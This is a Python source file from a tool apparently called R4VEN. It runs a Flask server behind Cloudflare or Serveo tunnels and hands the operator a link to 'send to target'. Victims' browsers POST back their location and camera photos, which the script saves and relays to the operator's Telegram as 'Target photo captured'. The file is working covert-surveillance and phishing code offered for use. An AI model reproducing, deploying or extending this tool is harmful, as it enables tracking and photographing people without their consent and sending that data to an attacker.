#!/usr/bin/env python3
# port_forward.py
import sys
import requests
import os
import socket
import subprocess
import threading
import logging
import argparse
import time
import signal
from flaredantic import FlareTunnel, FlareConfig
from flask import Flask, request, Response, send_from_directory
from utils import get_file_data, update_webhook, check_and_get_webhook_url, send_telegram_message

# ==============================================
# CONFIG LOGGING
# ==============================================
logging.basicConfig(filename='r4ven.log', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# ==============================================
# COLOR SETUP
# ==============================================
if sys.stdout.isatty():
    R = '\033[31m'; G = '\033[32m'; C = '\033[36m'
    W = '\033[0m';  Y = '\033[33m'; M = '\033[35m'; B = '\033[34m'
else:
    R = G = C = W = Y = M = B = ''

# ==============================================
# GLOBAL VARIABLES
# ==============================================
HTML_FILE_NAME = "index.html"
DISCORD_WEBHOOK_FILE_NAME = "dwebhook.js"
shutdown_flag = threading.Event()
app = Flask(__name__)

parser = argparse.ArgumentParser(
    description="R4VEN - Track device location, and IP address, and capture a photo with device details.",
    usage=f"{sys.argv[0]} [-t target] [-p port]"
)
parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
parser.add_argument("-p", "--port", nargs="?", help="port to listen on", type=int, default=8000)
args = parser.parse_args()

# ==============================================
# FLASK ROUTES
# ==============================================
@app.route("/", methods=["GET"])
def get_website():
    try:
        html_data = get_file_data(HTML_FILE_NAME)
    except FileNotFoundError:
        html_data = "<h1>File not found</h1>"
    return Response(html_data, content_type="text/html")

@app.route("/dwebhook.js", methods=["GET"])
def get_webhook_js():
    if os.path.exists(DISCORD_WEBHOOK_FILE_NAME):
        return send_from_directory(directory=os.getcwd(), path=DISCORD_WEBHOOK_FILE_NAME)
    return Response("// webhook file not found", content_type="application/javascript")

@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    telegram = check_and_get_webhook_url(os.getcwd())
    update_webhook(telegram, data)
    return "OK"

@app.route('/image', methods=['POST'])
def image():
    img = request.files['image']
    filename = f"{time.strftime('%Y%m%d-%H%M%S')}.jpeg"
    img.save(filename)
    print(f"{G}[+] {C}Captured image saved: {filename}{W}")

    telegram = check_and_get_webhook_url(os.getcwd())
    try:
        from utils import send_telegram_photo
        send_telegram_photo(telegram["token"], telegram["chat_id"], filename,
                            caption="📸 Target photo captured by R4VEN 🔥")
    except Exception as e:
        logging.error("Failed to send photo to Telegram: %s", e)
        print(f"{R}[!] Failed to send photo to Telegram: {e}{W}")
    return Response(f"{filename} saved and sent to Telegram")

@app.route('/get_target', methods=['GET'])
def get_url():
    return args.target

# ==============================================
# CORE FUNCTIONS
# ==============================================
def should_exclude_line(line):
    exclude_patterns = ["HTTP request"]
    return any(pattern in line for pattern in exclude_patterns)

# Flask runner
def run_flask(folder_name):
    try:
        os.chdir(folder_name)
    except FileNotFoundError:
        print(f"{R}Error: Folder '{folder_name}' not found.{W}")
        sys.exit(1)

    flask_thread = threading.Thread(target=app.run,
                                    kwargs={"host": "0.0.0.0", "port": args.port, "debug": False})
    flask_thread.daemon = True
    flask_thread.start()

    try:
        while not shutdown_flag.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"{R}Flask server terminated.{W}")
        shutdown_flag.set()

# ==============================================
# SIGNAL HANDLER
# ==============================================
def signal_handler(sig, frame):
    print(f"{R}\n[!] Exiting...{W}")
    shutdown_flag.set()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ==============================================
# CLOUDFLARE TUNNEL
# ==============================================
def run_tunnel():
    try:
        config = FlareConfig(port=args.port, verbose=True)
        with FlareTunnel(config) as tunnel:
            tunnel_url = tunnel.tunnel_url
            print(f"\n{G}[+] Flask app public URL: {C}{tunnel_url}{W}")

            telegram = check_and_get_webhook_url(os.getcwd())
            msg = f"🌐 Cloudflare tunnel started!\n\n🔗 <b>{tunnel_url}</b>\n\n👾 by trhacknon 🕶️"
            send_telegram_message(telegram["token"], telegram["chat_id"], msg)

            while not shutdown_flag.is_set():
                time.sleep(0.5)
    except Exception as e:
        logging.error("Error in Cloudflare tunnel: %s", e)
        print(f"{R}[!] Cloudflare tunnel error: {e}{W}")

# ==============================================
# SERVEO PORT FORWARDING
# ==============================================
def start_port_forwarding():
    try:
        command = ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{args.port}", "serveo.net"]
        logging.info("Starting Serveo with command: %s", " ".join(command))

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        url_printed = False

        telegram = check_and_get_webhook_url(os.getcwd())

        for line in process.stdout:
            line = line.strip()
            if not line:
                continue

            if "Forwarding HTTP traffic from" in line and not url_printed:
                url = line.split(" ")[-1]
                msg = (
                    f"\n{M}[+] {C}Send this URL to target: {G}{url}{W}\n"
                    f"{R}Do not close this window!{W}\n"
                )
                print(msg)
                send_telegram_message(
                    telegram["token"], telegram["chat_id"],
                    f"🚀 Serveo tunnel ready!\n\n🔗 <b>{url}</b>\n\n👾 by trhacknon 🕶️"
                )
                url_printed = True
            elif not should_exclude_line(line):
                print(line)

        for line in process.stderr:
            line = line.strip()
            if line and not should_exclude_line(line):
                logging.error(line)
                print(line)

    except Exception as e:
        logging.exception("Serveo error")
        print(f"{R}[!] Serveo error: {e}{W}")

# ==============================================
# CHECK SERVEO STATUS
# ==============================================
def is_serveo_up():
    print(f"\n{B}[?] {C}Checking Serveo.net availability...{W}", end="", flush=True)
    try:
        resp = requests.get("https://serveo.net", timeout=3)
        if resp.status_code == 200:
            print(f" {G}[UP]{W}")
            return True
    except requests.RequestException:
        pass
    print(f" {R}[DOWN]{W}")
    return False

# ==============================================
# USER PROMPT
# ==============================================
def ask_port_forwarding():
    serveo_status = "Up" if is_serveo_up() else "Down"
    print(f"\n{'_' * 70}")
    print(f"{B}[~] {C}Choose port forwarding method:{W}")
    print(f"{Y}1.{W} Serveo ({G}{serveo_status}{W})")
    print(f"{Y}2.{W} Cloudflare {G}(recommended){W}")
    print(f"{Y}3.{W} None (manual / Ngrok etc.)")
    print(f"\n{M}Note:{R} If 1 or 2 fails, use option 3 and port-forward manually.{W}")
    return input(f"\n{B}[+] {Y}Your choice: {W}")

# ==============================================
# PORT AVAILABILITY CHECK
# ==============================================
def is_port_available(port):
    print(f"{B}[?] {C}Checking if port {Y}{port}{C} is available...{W}", end="", flush=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        if sock.connect_ex(("127.0.0.1", port)) != 0:
            print(f" {G}[AVAILABLE]{W}")
            return True
        else:
            print(f" {R}[IN USE]{W}")
            return False
